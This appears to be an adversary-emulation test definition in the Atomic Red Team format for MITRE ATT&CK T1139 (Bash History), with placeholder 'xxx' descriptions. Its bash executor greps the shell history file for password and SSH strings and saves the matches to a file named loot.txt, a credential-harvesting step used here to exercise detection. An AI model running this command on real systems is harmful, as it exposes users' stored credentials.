---
attack_technique: T1139
display_name: Bash History

atomic_tests:
- name: xxx
  description: |
    xxx
  supported_platforms:
    - linux
    - macos
  args:
    - bash_history_filename:
        description: |
          xxx
        type: Path
        default: ~/.bash_history
    - bash_history_grep_args:
        description: |
          xxx
        type: String
        default: -e '-p ' -e 'pass' -e 'ssh'
    - output_file:
        description: |
          xxx
        type: Path
        default: ~/loot.txt

  executor:
    name: bash
    command: |
      cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}